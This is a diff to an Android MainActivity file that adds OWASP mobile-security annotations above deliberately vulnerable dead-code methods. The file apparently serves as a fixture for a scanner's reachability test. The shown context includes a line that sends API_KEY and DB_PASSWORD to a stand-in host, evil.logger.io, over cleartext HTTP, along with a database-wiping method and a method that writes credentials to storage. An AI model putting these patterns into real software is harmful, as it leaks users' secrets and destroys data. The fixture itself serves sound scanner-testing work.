@@ -69,6 +69,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // DEAD CODE - reachability test: should NOT be flagged
+    // Simulated Weakness: M1 (Improper Credential Usage) + M5 (Insecure Communication)
+    // MASVS: MASVS-NETWORK-1 (Credential Exfiltration via Cleartext HTTP)
+    // MASTG: MASTG-ANDROID-NET (Testing for Cleartext Traffic)
     private void leakCredentialsToUrl() {
         try {
             String leakUrl = "http://evil.logger.io/harvest?key=" + API_KEY + "&pass=" + DB_PASSWORD;
@@ -83,6 +86,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // DEAD CODE - reachability test: should NOT be flagged
+    // Simulated Weakness: M4 (Insufficient Input/Output Validation)
+    // MASVS: MASVS-CODE (Destructive SQL Execution)
+    // MASTG: MASTG-ANDROID-CODE (Testing for SQL Injection)
     private void nukeDatabase() {
         UserDatabaseHelper helper = new UserDatabaseHelper(this);
         SQLiteDatabase db = helper.getWritableDatabase();
@@ -92,6 +98,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // DEAD CODE - reachability test: should NOT be flagged
+    // Simulated Weakness: M9 (Insecure Data Storage)
+    // MASVS: MASVS-STORAGE (Credentials Written to External Storage)
+    // MASTG: MASTG-ANDROID-STORE (Testing Local Storage for Sensitive Data)
     @SuppressWarnings("deprecation")
     private void writeCredsToExternalStorage() {
         try {
